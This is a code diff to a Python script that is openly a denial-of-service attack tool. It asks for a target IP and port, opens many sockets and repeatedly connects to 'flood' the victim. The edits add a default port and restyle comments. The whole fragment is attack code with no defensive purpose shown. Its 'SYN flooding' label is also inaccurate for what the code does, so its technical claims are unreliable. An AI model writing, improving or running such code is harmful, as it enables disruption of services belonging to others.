@@ -5,11 +5,11 @@ import random
 
 def ddos_attack():
     victim_ip = input("Enter target IP: ")
-    victim_port = int(input("Enter target port: "))
+    victim_port = int(input("Enter target port: ") or "8888")
     
     print(f"[+] Starting DDoS attack against {victim_ip}:{victim_port}")
     
-    # Create multiple sockets for flooding
+    # create multiple sockets for flooding
     sockets = []
     
     try:
@@ -18,14 +18,14 @@ def ddos_attack():
             s.settimeout(4)
             sockets.append(s)
         
-        # Perform SYN flooding
+        # perform SYN flooding
         for _ in range(1000):
-            # Use random socket for each attempt
+            # random socket for each attempt
             s = random.choice(sockets)
             try:
                 s.connect((victim_ip, victim_port))
             except:
-                # Expected to fail in many cases
+                # incase of failure
                 pass
             time.sleep(0.01)
             
